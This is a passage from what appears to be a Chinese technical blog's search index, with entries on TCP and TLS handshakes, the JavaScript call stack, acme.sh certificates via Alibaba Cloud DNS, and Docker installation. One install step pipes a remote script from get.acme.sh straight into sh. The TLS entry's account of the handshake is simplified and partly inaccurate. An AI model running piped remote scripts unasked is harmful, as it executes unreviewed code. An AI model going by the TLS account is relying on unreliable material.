方法，如果我们能够获得对应标签页的引用，就可以使用 postMessage 方法，进行通信。</li>\n</ul>\n","categories":["浏览器","通讯"],"tags":["前端","浏览器","性能优化"]},{"title":"TCP（Transmission Control Protocol，传输控制协议）","url":"//browser/protocol/tcp.html","content":"<h2 id=\"TCP（Transmission-Control-Protocol，传输控制协议）\"><a href=\"#TCP（Transmission-Control-Protocol，传输控制协议）\" class=\"headerlink\" title=\"TCP（Transmission Control Protocol，传输控制协议）\"></a>TCP（Transmission Control Protocol，传输控制协议）</h2><p>TCP（Transmission Control Protocol，传输控制协议）是一种面向连接的、可靠的、基于字节流的传输层通信协议，广泛用于互联网中的数据传输。它是 TCP/IP 模型中的核心协议之一，与 IP（Internet Protocol，互联网协议）协同工作，负责在多个网络设备之间传输数据。</p>\n<p>TCP 协议的主要特点和功能包括：</p>\n<ol>\n<li><p>面向连接:</p>\n<p> 在数据传输开始之前，TCP 需要在两端建立一个连接，通常通过三次握手（three-way handshake）过程完成。</p>\n</li>\n<li><p>可靠性传输:</p>\n<p> TCP 提供可靠的数据传输服务，确保数据无差错、不丢失、不重复，并且按序到达。它通过序列号、确认应答（ACKs）、超时重传等机制实现这一点。</p>\n</li>\n<li><p>流量控制:</p>\n<p> TCP 使用滑动窗口协议来进行流量控制，防止快速发送方淹没慢速接收方。</p>\n</li>\n<li><p>拥塞控制:</p>\n<p> TCP 实现拥塞控制算法，如慢启动（Slow Start）、拥塞避免（Congestion Avoidance）、快速重传（Fast Retransmit）和快速恢复（Fast Recovery），以避免网络拥塞。</p>\n</li>\n<li><p>全双工通信:</p>\n<p> TCP 提供全双工服务，意味着数据可以在两个方向上同时传输，双方都可以是发送者和接收者。</p>\n</li>\n<li><p>顺序控制和数据重组:</p>\n<p> TCP 在数据包传输中使用序列号对数据包进行排序，确保接收端可以根据这些序列号将数据重新组合成原始的数据流。</p>\n</li>\n<li><p>错误检测:</p>\n<p> TCP 头部包含校验和（checksum）字段，用于检测数据在传输过程中的任何错误。</p>\n</li>\n<li><p>连接管理:</p>\n<p> TCP 协议管理和维护连接的生命周期，包括连接的建立、数据传输和连接的终止（通常通过四次挥手（four-way handshake）过程实现）。</p>\n</li>\n</ol>\n<p>在 TCP/IP 协议栈中，TCP 位于传输层，正上方是应用层，应用层协议如 HTTP、FTP 等使用 TCP 来保证数据传输的可靠性；正下方是网络层，网络层协议如 IP 负责将数据包路由到正确的目的地。TCP 处理的是端到端的通信，确保数据能够在应用程序之间准确无误地传输。</p>\n<p>由于 TCP 提供的可靠性和面向连接的特性，它广泛用于需要保证数据完整性和正确顺序的应用场景，如网页浏览、文件传输、电子邮件发送等。</p>\n<p>下面我们再看下完整的 TCP 连接过程，通过这个过程你可以明白 TCP 是如何保证重传机制和数据包的排序功能的。</p>\n<p>从下图可以看出，一个完整的 TCP 连接的生命周期包括了 “建立连接”“传输数据” 和 “断开连接” 三个阶段。</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6613c26168eb9357131cee1d.png\" alt=\"一个TCP连接的生命周期\"></p>\n<h2 id=\"TCP三次握手\"><a href=\"#TCP三次握手\" class=\"headerlink\" title=\"TCP三次握手\"></a>TCP 三次握手</h2><p>TCP 三次握手（Three-way Handshake）是建立 TCP/IP 网络连接的标准过程，其目的是在两个网络主机之间创建一个可靠的连接。这个过程确保了双方都准备好接收和发送数据，并且同步了双方的初始序列号，用于数据包的正确排序和可靠传输。下面是 TCP 三次握手的详细步骤：</p>\n<h3 id=\"第一次握手：SYN\"><a href=\"#第一次握手：SYN\" class=\"headerlink\" title=\"第一次握手：SYN\"></a>第一次握手：SYN</h3><p><strong>客户端发送 SYN 包</strong>:</p>\n<p>客户端选择一个初始序列号（ISN）并向服务器发送一个 SYN（同步）包。这个 SYN 包包含客户端的初始序列号，并且 SYN 标志位被设置为 1，其他标志位（如 ACK）被设置为 0。</p>\n<h3 id=\"第二次握手：SYN-ACK\"><a href=\"#第二次握手：SYN-ACK\" class=\"headerlink\" title=\"第二次握手：SYN-ACK\"></a>第二次握手：SYN-ACK</h3><p><strong>服务器回应 SYN-ACK 包</strong>:</p>\n<p>服务器接收到 SYN 包后，发送一个 SYN-ACK（同步 - 确认）包作为回应。该包含有服务器自己的初始序列号，同时将客户端的初始序列号加 1，并在 ACK 字段中回传此值，以确认接收到客户端的 SYN。此时，SYN 和 ACK 标志位都被设置为 1。</p>\n<h3 id=\"第三次握手：ACK\"><a href=\"#第三次握手：ACK\" class=\"headerlink\" title=\"第三次握手：ACK\"></a>第三次握手：ACK</h3><p><strong>客户端发送 ACK 包</strong>:</p>\n<p>客户端收到 SYN-ACK 包后，将服务器的序列号加 1，并将这个值放在 ACK 包的确认字段中，发送给服务器。这个 ACK 包的 ACK 标志位设置为 1，表示确认。</p>\n<h3 id=\"握手完成\"><a href=\"#握手完成\" class=\"headerlink\" title=\"握手完成\"></a>握手完成</h3><p><strong>连接建立</strong>:</p>\n<p>服务器接收到客户端的 ACK 包后，三次握手完成，客户端和服务器之间建立了一个双向的可靠连接。之后，数据可以在双方之间开始传输。</p>\n<p>这个过程的关键在于两次增量序列号的交换，这保证了双方都能确认对方已准备好进行通信，并且正确地维护了 TCP 的状态信息。三次握手可以防止历史连接的初始化数据段突然出现在当前连接中，从而导致不可预料的问题。</p>\n<p>简化的表示如下：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">客户端                     服务器</span><br><span class=\"line\">  |-----SYN(X)------------&gt;|</span><br><span class=\"line\">  |&lt;----SYN(Y), ACK(X+1)---|</span><br><span class=\"line\">  |-----ACK(Y+1)----------&gt;|</span><br></pre></td></tr></tbody></table></figure>\n\n<p>其中，X 和 Y 分别是客户端和服务器选择的初始序列号。</p>\n<p>值得注意的是，TCP 三次握手仅仅是建立连接的一部分，数据传输会在三次握手之后开始，而在数据传输结束后，TCP 用另一个独立的四次挥手（Four-way Handshake）过程来关闭连接。</p>\n<h2 id=\"TCP四次挥手\"><a href=\"#TCP四次挥手\" class=\"headerlink\" title=\"TCP四次挥手\"></a>TCP 四次挥手</h2><p>TCP（传输控制协议）四次挥手是用于终止一个已经建立的 TCP 连接的过程。这个过程确保了双方都能够完成数据传输并且正确关闭连接。以下是 TCP 四次挥手的详细步骤：</p>\n<h3 id=\"第一次挥手：FIN-WAIT-1\"><a href=\"#第一次挥手：FIN-WAIT-1\" class=\"headerlink\" title=\"第一次挥手：FIN_WAIT_1\"></a>第一次挥手：FIN_WAIT_1</h3><ul>\n<li>假设客户端决定关闭连接，它发送一个 FIN（结束）标志的 TCP 段给服务器，表示客户端已经没有数据要发送了。</li>\n<li>客户端进入 FIN_WAIT_1 状态，等待服务器的确认。</li>\n</ul>\n<h3 id=\"第二次挥手：CLOSE-WAIT\"><a href=\"#第二次挥手：CLOSE-WAIT\" class=\"headerlink\" title=\"第二次挥手：CLOSE_WAIT\"></a>第二次挥手：CLOSE_WAIT</h3><ul>\n<li>服务器收到这个 FIN 段后，发送一个 ACK（确认）标志的 TCP 段作为回应，确认已经收到客户端的终止请求。</li>\n<li>服务器进入 CLOSE_WAIT 状态，此时客户端收到 ACK 后进入 FIN_WAIT_2 状态。</li>\n<li>此时，客户端到服务器的连接已经关闭，但是服务器如果还有数据要发送，可以继续发送。</li>\n</ul>\n<h3 id=\"第三次挥手：LAST-ACK\"><a href=\"#第三次挥手：LAST-ACK\" class=\"headerlink\" title=\"第三次挥手：LAST_ACK\"></a>第三次挥手：LAST_ACK</h3><ul>\n<li>当服务器完成数据发送后，它也会决定关闭连接，发送一个 FIN 标志的 TCP 段给客户端。</li>\n<li>服务器进入 LAST_ACK 状态，等待客户端的确认。</li>\n</ul>\n<h3 id=\"第四次挥手：TIME-WAIT\"><a href=\"#第四次挥手：TIME-WAIT\" class=\"headerlink\" title=\"第四次挥手：TIME_WAIT\"></a>第四次挥手：TIME_WAIT</h3><ul>\n<li>客户端收到服务器的 FIN 段后，发送一个 ACK 标志的 TCP 段作为回应，确认已经收到服务器的终止请求。</li>\n<li>客户端进入 TIME_WAIT 状态，持续 2 个最大段生命周期（MSL）的时间后，确保服务器能够接收到确认，然后关闭连接。</li>\n<li>服务器收到 ACK 后，关闭连接，进入 CLOSED 状态。</li>\n</ul>\n<p>这个过程确保了双方都有机会完成数据传输并清理连接。如果在四次挥手过程中的任何一步发生网络延迟或丢包，TCP 协议会重试发送丢失的段，直到成功完成四次挥手过程。这个过程是 TCP 提供可靠传输服务的关键机制之一。</p>\n<p>简化的表示如下：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"> 客户端                       服务器</span><br><span class=\"line\">FIN_WAIT_1    |-----FIN----&gt;|</span><br><span class=\"line\">FIN_WAIT_2    |&lt;----ACK-----| CLOSE_WAIT</span><br><span class=\"line\">              |&lt;----FIN-----| LAST_ACK</span><br><span class=\"line\">TIME_WAIT     |-----ACK----&gt;| CLOSED</span><br></pre></td></tr></tbody></table></figure>\n","categories":["浏览器","protocol"],"tags":["前端","浏览器","TCP"]},{"title":"TLS（Transport Layer Security，传输层安全协议）三次握手","url":"//browser/protocol/tls.html","content":"<p>TLS（Transport Layer Security，传输层安全协议）三次握手是建立安全层通信的一个过程，它确保了数据在两个通信实体之间的传输是加密和身份验证的。TLS 是一种安全协议，通常用于在网络中传输数据时提供保密性和数据完整性保护。TLS 也可以用作其他协议的底层安全层，例如 HTTPS（超文本传输安全协议）是 HTTP 协议的安全版本，它使用了 TLS/SSL 协议进行数据传输。</p>\n<p>TLS 三次握手过程如下：</p>\n<ol>\n<li><p><strong>客户端 Hello（ClientHello）</strong>:</p>\n<ul>\n<li>客户端开始建立连接，发送一个 ClientHello 消息给服务器。这个消息包括客户端支持的 TLS 版本、一个客户端生成的随机数（ClientRandom），以及客户端支持的加密套件列表（cipher suites）。</li>\n<li>客户端还可能会请求服务器的证书，以及其它与安全相关的信息。</li>\n</ul>\n</li>\n<li><p><strong>服务器 Hello（ServerHello）</strong>:</p>\n<ul>\n<li>服务器收到 ClientHello 消息后，会从客户端提供的加密套件列表中选择一个加密算法，并在 ServerHello 消息中通知客户端。</li>\n<li>服务器也会生成一个随机数（ServerRandom），并把自己的证书（包含公钥）发送给客户端。如果服务器需要对客户端进行身份验证，它也可以发送一个证书请求。</li>\n</ul>\n</li>\n<li><p><strong>客户端验证（Client Verification）</strong>:</p>\n<ul>\n<li>客户端收到服务器的证书后，会验证其有效性（例如，检查证书是否过期，是否由受信任的证书颁发机构签发等）。</li>\n<li>客户端会生成第三个随机数（ClientVerifyRandom），并使用服务器的公钥加密这个随机数，然后将加密后的数据发送给服务器（Pre-Master Secret）。</li>\n<li>如果服务器请求了客户端证书，客户端也会发送自己的证书。</li>\n</ul>\n</li>\n<li><p><strong>服务器完成（Server Finished）</strong>:</p>\n<ul>\n<li>服务器使用自己的私钥解密收到的 Pre-Master Secret。</li>\n<li>服务器和客户端都将使用 ClientRandom、ServerRandom 和 ClientVerifyRandom 这三个随机数，通过一定的算法生成相同的会话密钥（Session Key）。</li>\n<li>服务器发送 Finished 消息给客户端，这个消息是使用新生成的会话密钥加密的。</li>\n</ul>\n</li>\n<li><p><strong>客户端完成（Client Finished）</strong>:</p>\n<ul>\n<li>客户端收到服务器的 Finished 消息后，使用会话密钥解密，并验证消息的正确性。</li>\n<li>客户端也发送一个 Finished 消息给服务器，同样使用会话密钥加密。</li>\n</ul>\n</li>\n</ol>\n<p>完成以上步骤后，客户端和服务器就建立了一个安全的连接，可以开始安全地传输数据。需要注意的是，TLS 协议中的 “三次握手” 与 TCP 协议的三次握手是不同的概念。TLS 的三次握手是指在 TLS 密钥交换过程中的步骤，而 TCP 的三次握手是指在建立一个可靠的传输层连接的过程中的步骤。</p>\n","categories":["浏览器","protocol"],"tags":["前端","浏览器","TLS"]},{"title":"什么是 JavaScript 的调用栈","url":"//browser/javascript/stack.html","content":"<p>JavaScript 引擎正是利用栈的这种结构来管理执行上下文的。在执行上下文创建好后，JavaScript 引擎会将执行上下文压入栈中，通常把这种用来管理执行上下文的栈称为执行上下文栈，又称调用栈。</p>\n<p>为便于你更好地理解调用栈，下面我们再来看段稍微复杂点的示例代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">var</span> a = <span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">add</span>(<span class=\"params\">b,c</span>){</span><br><span class=\"line\">  <span class=\"keyword\">return</span> b+c</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">addAll</span>(<span class=\"params\">b,c</span>){</span><br><span class=\"line\"><span class=\"keyword\">var</span> d = <span class=\"number\">10</span></span><br><span class=\"line\">result = <span class=\"title function_\">add</span>(b,c)</span><br><span class=\"line\"><span class=\"keyword\">return</span>  a+result+d</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"title function_\">addAll</span>(<span class=\"number\">3</span>,<span class=\"number\">6</span>)</span><br></pre></td></tr></tbody></table></figure>\n\n<p>在上面这段代码中，你可以看到它是在 addAll 函数中调用了 add 函数，那在整个代码的执行过程中，调用栈是怎么变化的呢？</p>\n<p>下面我们就一步步地分析在代码的执行过程中，调用栈的状态变化情况。</p>\n<p>第一步，创建全局上下文，并将其压入栈底。如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/66208e950ea9cb1403d68448.png\" alt=\"全局执行上下文压栈\"></p>\n<p>从图中你也可以看出，变量 a、函数 add 和 addAll 都保存到了全局上下文的变量环境对象中。</p>\n<p>全局执行上下文压入到调用栈后，JavaScript 引擎便开始执行全局代码了。首先会执行 a=2 的赋值操作，执行该语句会将全局上下文变量环境中 a 的值设置为 2。设置后的全局上下文的状态如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662090130ea9cb1403e0909e.png\" alt=\"赋值操作改变执行上下文中的值\"></p>\n<p>接下来，第二步是调用 addAll 函数。当调用该函数时，JavaScript 引擎会编译该函数，并为其创建一个执行上下文，最后还将该函数的执行上下文压入栈中，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662090720ea9cb1403e2eec8.png\" alt=\"执行addAll函数时的调用栈\"></p>\n<p>addAll 函数的执行上下文创建好之后，便进入了函数代码的执行阶段了，这里先执行的是 d=10 的赋值操作，执行语句会将 addAll 函数执行上下文中的 d 由 undefined 变成了 10。</p>\n<p>然后接着往下执行，第三步，当执行到 add 函数调用语句时，同样会为其创建执行上下文，并将其压入调用栈，如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662090a30ea9cb1403e425b4.png\" alt=\"执行add函数时的调用栈\"></p>\n<p>当 add 函数返回时，该函数的执行上下文就会从栈顶弹出，并将 result 的值设置为 add 函数的返回值，也就是 9。如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662090c80ea9cb1403e523a9.png\" alt=\"add函数执行结束时的调用栈\"></p>\n<p>紧接着 addAll 执行最后一个相加操作后并返回，addAll 的执行上下文也会从栈顶部弹出，此时调用栈中就只剩下全局上下文了。最终如下图所示：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662090f60ea9cb1403e639d6.png\" alt=\"addAll函数执行结束时的调用栈\"></p>\n<p>至此，整个 JavaScript 流程执行结束了。</p>\n<p>好了，现在你应该知道了<strong>调用栈是 JavaScript 引擎追踪函数执行的一个机制</strong>，当一次有多个函数被调用时，通过调用栈就能够追踪到哪个函数正在被执行以及各函数之间的调用关系。</p>\n<h2 id=\"在开发中，如何利用好调用栈\"><a href=\"#在开发中，如何利用好调用栈\" class=\"headerlink\" title=\"在开发中，如何利用好调用栈\"></a>在开发中，如何利用好调用栈</h2><p>鉴于调用栈的重要性和实用性，那么接下来我们就一起来看看在实际工作中，应该如何查看和利用好调用栈。</p>\n<h3 id=\"如何利用浏览器查看调用栈的信息\"><a href=\"#如何利用浏览器查看调用栈的信息\" class=\"headerlink\" title=\"如何利用浏览器查看调用栈的信息\"></a>如何利用浏览器查看调用栈的信息</h3><p>当你执行一段复杂的代码时，你可能很难从代码文件中分析其调用关系，这时候你可以在你想要查看的函数中加入断点，然后当执行到该函数时，就可以查看该函数的调用栈了。</p>\n<p>这么说可能有点抽象，这里我们拿上面的那段代码做个演示，你可以打开 “开发者工具”，点击 “Source” 标签，选择 JavaScript 代码的页面，然后在第 3 行加上断点，并刷新页面。你可以看到执行到 add 函数时，执行流程就暂停了，这时可以通过右边 “call stack” 来查看当前的调用栈的情况，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/6620919e0ea9cb1403ea1c3f.png\" alt=\"查看函数调用关系\"></p>\n<p>从图中可以看出，右边的 “call stack” 下面显示出来了函数的调用关系：栈的最底部是 anonymous，也就是全局的函数入口；中间是 addAll 函数；顶部是 add 函数。这就清晰地反映了函数的调用关系，所以<strong>在分析复杂结构代码，或者检查 Bug 时，调用栈都是非常有用的</strong>。</p>\n<p>除了通过断点来查看调用栈，你还可以使用 console.trace () 来输出当前的函数调用关系，比如在示例代码中的 add 函数里面加上了 console.trace ()，你就可以看到控制台输出的结果，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662091dd0ea9cb1403ebbedf.png\" alt=\"使用trace函数输出当前调用栈信息\"></p>\n<h3 id=\"栈溢出（Stack-Overflow）\"><a href=\"#栈溢出（Stack-Overflow）\" class=\"headerlink\" title=\"栈溢出（Stack Overflow）\"></a>栈溢出（Stack Overflow）</h3><p>现在你知道了调用栈是一种用来管理执行上下文的数据结构，符合后进先出的规则。不过还有一点你要注意，调用栈是有大小的，当入栈的执行上下文超过一定数目，JavaScript 引擎就会报错，我们把这种错误叫做栈溢出。</p>\n<p>特别是在你写递归代码的时候，就很容易出现栈溢出的情况。比如下面这段代码：</p>\n<figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">division</span>(<span class=\"params\">a,b</span>){</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"title function_\">division</span>(a,b)</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(<span class=\"title function_\">division</span>(<span class=\"number\">1</span>,<span class=\"number\">2</span>))</span><br></pre></td></tr></tbody></table></figure>\n\n<p>当执行时，就会抛出栈溢出错误，如下图：</p>\n<p><img data-src=\"https://pic.imgdb.cn/item/662092120ea9cb1403ed1894.png\" alt=\"栈溢出错误\"></p>\n<p>从上图你可以看到，抛出的错误信息为：超过了最大栈调用大小（Maximum call stack size exceeded）。</p>\n<p>那为什么会出现这个问题呢？这是因为当 JavaScript 引擎开始执行这段代码时，它首先调用函数 division，并创建执行上下文，压入栈中；然而，这个函数是递归的，并且没有任何终止条件，所以它会一直创建新的函数执行上下文，并反复将其压入栈中，但栈是有容量限制的，超过最大数量后就会出现栈溢出的错误。</p>\n<p>理解了栈溢出原因后，你就可以使用一些方法来避免或者解决栈溢出的问题，比如把递归调用的形式改造成其他形式，或者使用加入定时器的方法来把当前任务拆分为其他很多小任务。</p>\n<h2 id=\"示例\"><a href=\"#示例\" class=\"headerlink\" title=\"示例\"></a>示例</h2><figure class=\"highlight js\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">bar</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">var</span> myName = <span class=\"string\">\"极客世界\"</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> test1 = <span class=\"number\">100</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"number\">1</span>) {</span><br><span class=\"line\">        <span class=\"keyword\">let</span> myName = <span class=\"string\">\"Chrome浏览器\"</span></span><br><span class=\"line\">        <span class=\"variable language_\">console</span>.<span class=\"title function_\">log</span>(test)</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"title function_\">foo</span>(<span class=\"params\"></span>) {</span><br><span class=\"line\">    <span class=\"keyword\">var</span> myName = <span class=\"string\">\"极客邦\"</span></span><br><span class=\"line\">    <span class=\"keyword\">let</span> test = <span class=\"number\">2</span></span><br><span class=\"line\">    {</span><br><span class=\"line\">        <span class=\"keyword\">let</span> test = <span class=\"number\">3</span></span><br><span class=\"line\">        <span class=\"title function_\">bar</span>()</span><br><span class=\"line\">    }</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"keyword\">var</span> myName = <span class=\"string\">\"极客时间\"</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> myAge = <span class=\"number\">10</span></span><br><span class=\"line\"><span class=\"keyword\">let</span> test = <span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"title function_\">foo</span>()</span><br></pre></td></tr></tbody></table></figure>\n\n<h2 id=\"调用栈分析\"><a href=\"#调用栈分析\" class=\"headerlink\" title=\"调用栈分析\"></a>调用栈分析</h2><p><img data-src=\"https://pic.imgdb.cn/item/661f8ef80ea9cb140395bde2.png\" alt=\"调用栈分析图\"></p>\n<p>当 <code>foo</code> 在执行时</p>\n<ol>\n<li>会先去它当前所在的 <code>if</code> 词法环境中查找；</li>\n<li>在去 <code>bar</code> 所在的词法环境中查找；</li>\n<li>再去 <code>bar</code> 所在的变量环境中查找；</li>\n<li>全局执行上下文中的词法环境中查找；</li>\n<li>最后在变量环境下去查找。</li>\n</ol>\n<p>最终输出：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">1</span><br></pre></td></tr></tbody></table></figure>\n","categories":["浏览器","javascript"],"tags":["前端","javascript"]},{"title":"Acme 证书","url":"//linux/cert/acme.html","content":"<p>acme.sh 是一个纯 Unix Shell 脚本，用于从证书颁发机构（如 Let’s Encrypt）自动获得 SSL/TLS 证书。它实现了 ACME 协议并支持多种 DNS 服务商解析，包括阿里云（Alibaba Cloud）。</p>\n<p>如果你想要使用 acme.sh 来签发一个使用阿里云 DNS 解析的域名的 SSL 证书，可以按照以下步骤操作：</p>\n<p>在使用之前，确保您已经在系统上安装了 acme.sh。如果尚未安装，可以使用以下命令进行安装：</p>\n<h3 id=\"安装Acme\"><a href=\"#安装Acme\" class=\"headerlink\" title=\"安装Acme\"></a>安装 Acme</h3><figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">curl https://get.acme.sh | sh -s email=abc@gmail.com</span><br></pre></td></tr></tbody></table></figure>\n\n<p>配置环境变量</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># ~/.zshrc</span></span><br><span class=\"line\"><span class=\"built_in\">alias</span> acme.sh=~/.acme.sh/acme.sh</span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"配置阿里云的-API-密钥\"><a href=\"#配置阿里云的-API-密钥\" class=\"headerlink\" title=\"配置阿里云的 API 密钥\"></a>配置阿里云的 API 密钥</h3><p>登录阿里云控制台并在 <span class=\"exturl\" data-url=\"aHR0cHM6Ly9yYW0uY29uc29sZS5hbGl5dW4uY29tL292ZXJ2aWV3\">RAM<i class=\"fa fa-external-link-alt\"></i></span> 登录到阿里云控制台，在 RAM（资源访问管理）中创建一个具有 AliyunDNSFullAccess 权限的 RAM 用户，以便 acme.sh 可以通过 API 修改 DNS 记录。记录下 AccessKeyId 和 AccessKeySecret。</p>\n<p>在终端中配置阿里云的 API 密钥。将 YourAccessKeyID 和 YourAccessKeySecret 替换为实际的 ID 和密钥：<br>然后将这些密钥配置在环境变量 <code>account.conf</code> 中：</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">export</span> Ali_Key=<span class=\"string\">\"YourAccessKeyID\"</span></span><br><span class=\"line\"><span class=\"built_in\">export</span> Ali_Secret=<span class=\"string\">\"YourAccessKeySecret\"</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"使用-acme-sh-生成证书\"><a href=\"#使用-acme-sh-生成证书\" class=\"headerlink\" title=\"使用 acme.sh 生成证书\"></a>使用 <code>acme.sh</code> 生成证书</h3><p>执行以下命令为 <code>ai.test.com</code> 域名签发证书：</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">acme.sh --issue --dns dns_ali -d ai.test.com</span><br></pre></td></tr></tbody></table></figure>\n\n<p>此步骤 <code>acme.sh</code> 会自动调用阿里云的 API，在 DNS 记录中添加 ACME 验证记录以证明域名的所有权。</p>\n<h3 id=\"安装证书至-Nginx-配置目录\"><a href=\"#安装证书至-Nginx-配置目录\" class=\"headerlink\" title=\"安装证书至 Nginx 配置目录\"></a>安装证书至 Nginx 配置目录</h3><p>一旦证书成功生成，使用下面的命令将证书和密钥安装到指定的路径，并设置权限：</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">acme.sh --install-cert -d ai.test.com \\</span><br><span class=\"line\">    --key-file       /etc/nginx/cert/ai.test.com/ai.test.com.key \\</span><br><span class=\"line\">    --fullchain-file /etc/nginx/cert/ai.test.com/ai.test.com.cer \\</span><br><span class=\"line\">    --reloadcmd     <span class=\"string\">\"nginx -t &amp;&amp; service nginx reload\"</span></span><br></pre></td></tr></tbody></table></figure>\n\n<h3 id=\"更新-Nginx-配置\"><a href=\"#更新-Nginx-配置\" class=\"headerlink\" title=\"更新 Nginx 配置\"></a>更新 Nginx 配置</h3><p>编辑 <code>/etc/nginx/cert/ai.test.com/ai.test.com.conf</code> 文件，添加 SSL 配置部分，类似于以下内容：</p>\n<figure class=\"highlight nginx\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"section\">server</span> {</span><br><span class=\"line\">    <span class=\"attribute\">listen</span> <span class=\"number\">443</span> ssl;</span><br><span class=\"line\">    <span class=\"attribute\">server_name</span> ai.test.com;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"attribute\">ssl_certificate</span> /etc/nginx/cert/ai.test.com/ai.test.com.cer;</span><br><span class=\"line\">    <span class=\"attribute\">ssl_certificate_key</span> /etc/nginx/cert/ai.test.com/ai.test.com.key;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># ...其他配置文件内容...</span></span><br><span class=\"line\">}</span><br></pre></td></tr></tbody></table></figure>\n\n<p>确保 SSL 证书路径与 <code>--install-cert</code> 命令中指定的路径一致。</p>\n<h3 id=\"检查-Nginx-配置并重启\"><a href=\"#检查-Nginx-配置并重启\" class=\"headerlink\" title=\"检查 Nginx 配置并重启\"></a>检查 Nginx 配置并重启</h3><p>在应用配置更改之前，检查 Nginx 配置是否正确：</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">nginx -t</span><br></pre></td></tr></tbody></table></figure>\n\n<p>如果上述命令显示配置测试成功，则可以安全地重新加载或重启 Nginx 以应用新的配置：</p>\n<figure class=\"highlight sh\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">service nginx reload</span><br></pre></td></tr></tbody></table></figure>\n\n<p>以上就是使用 <code>acme.sh</code> 结合阿里云 DNS 解析服务生成 SSL 证书并配置 Nginx 的步骤。在完成这些步骤之后，<code>ai.test.com</code> 应该能够通过 HTTPS 安全地提供服务，且 <code>acme.sh</code> 会自动设置续订任务以保证证书在到期前被更新。</p>\n","categories":["linux","nginx"],"tags":["nginx","linux","cert"]},{"title":"deb  使用命令","url":"//linux/install/deb.html","content":"<p>使用 dpkg 命令：在终端中运行以下命令来安装.deb 文件：</p>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo dpkg -i &lt;filename&gt;.deb</span><br></pre></td></tr></tbody></table></figure>\n","categories":["前端","es6"],"tags":["前端","linux","Git","deb"]},{"title":"Docker 的安装和使用","url":"//linux/install/docker.html","content":"<h4 id=\"Linux上安装Docker分为以下几步：\"><a href=\"#Linux上安装Docker分为以下几步：\" class=\"headerlink\" title=\"Linux上安装Docker分为以下几步：\"></a>Linux 上安装 Docker 分为以下几步：</h4><ol>\n<li>设置存储库。</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo yum install -y yum-utils</span><br><span class=\"line\"></span><br><span class=\"line\">sudo yum-config-manager --add-repo https://download.docker.com/linux/centos/docker-ce.repo</span><br><span class=\"line\"></span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"2\">\n<li>安装 Docker 引擎 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo yum install docker-ce docker-ce-cli containerd.io</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"3\">\n<li>启动 Docker</li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl start docker</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"4\">\n<li>设置 docker 开机自启动 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo systemctl enable docker</span><br></pre></td></tr></tbody></table></figure>\n\n<ol start=\"5\">\n<li>配置镜像加速器 </li>\n</ol>\n<figure class=\"highlight shell\"><table><tbody><tr><td class=\"code\"><pre><span class=\"line\">sudo mkdir -p /etc/docker</span><br><span class=\"line\">sudo tee /etc/docker/daemon.json &lt;&lt;-'EOF'</span><br><span class=\"line\">{</span><br><span class=\"line\">  \"registry-mirrors\": [\"https://om7zpa5s.mirror.aliyuncs.com\"]</span><br><span class=\"line\">}</span><br><span class=\"line\">EOF</span><br><span 